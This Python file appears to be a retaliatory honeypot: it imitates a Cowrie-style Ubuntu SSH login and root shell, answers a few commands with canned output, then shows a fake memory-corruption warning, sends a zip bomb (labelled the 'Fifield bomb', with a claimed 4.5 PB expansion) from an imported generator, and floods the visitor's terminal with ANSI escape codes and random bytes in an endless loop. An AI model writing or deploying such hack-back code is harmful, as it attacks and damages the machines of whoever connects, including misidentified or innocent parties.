import time
import os
import random
from scripts import zip_generator

def terminal_crusher(client_socket):
    """Mantenemos el motor ANSI para rematar la sesión"""
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            payload = ansi_bomb + (os.urandom(1024 * 100)) # Inyección de basura rápida
            client_socket.send(payload)
            time.sleep(0.05)
    except: pass

def handle_cowrie_trap(client_socket, ip):
    """Simulación de Cowrie que entrega la Bomba Fifield tras varios comandos."""
    try:
        banner = b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n\r\n"
        client_socket.send(banner)
        client_socket.send(f"hell-node-01 login: ".encode())
        client_socket.recv(1024)
        client_socket.send(b"Password: ")
        client_socket.recv(1024)
        
        prompt = b"root@hell-node-01:~# "
        client_socket.send(b"\r\nWelcome to Ubuntu 22.04.3 LTS\r\n")
        
        # Simulamos una sesión breve antes del disparo
        command_limit = random.randint(3, 5)
        for i in range(command_limit):
            client_socket.send(prompt)
            cmd = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
            if not cmd: break
            
            # Respuestas simuladas básicas
            if "ls" in cmd: client_socket.send(b"total 24\r\ndrwxr-xr-x 2 root root 4096 Feb 25 10:00 .\r\ndrwxr-xr-x 3 root root 4096 Feb 25 09:45 ..\r\n-rw-r--r-- 1 root root  220 Jan  6  2022 .bash_logout\r\n-rw-r--r-- 1 root root 3771 Jan  6  2022 .bashrc\r\n")
            elif "whoami" in cmd: client_socket.send(b"root\r\n")
            elif "id" in cmd: client_socket.send(b"uid=0(root) gid=0(root) groups=0(root)\r\n")
            elif "pwd" in cmd: client_socket.send(b"/root\r\n")
            else: client_socket.send(f"bash: {cmd}: command not found\r\n".encode())

        # EXPLOIT CHANNEL: Inyección tras agotarse la paciencia del sistema
        print(f"[💀] SSH SESSION LIMIT REACHED: Inyectando Bomba Fifield a {ip}")
        client_socket.send(b"\r\n*** SYSTEM CRITICAL ERROR: MEMORY CORRUPTION DETECTED ***\r\n")
        client_socket.send(b"*** INITIATING CORE DUMP (BINARY STREAM: 368 Mb) ***\r\n")
        
        # Obtener el payload de alta densidad (4.5 PB Expansión)
        zip_payload = zip_generator.generate_ultra_zip()
        client_socket.send(zip_payload)
        
        terminal_crusher(client_socket)
        
    except: pass
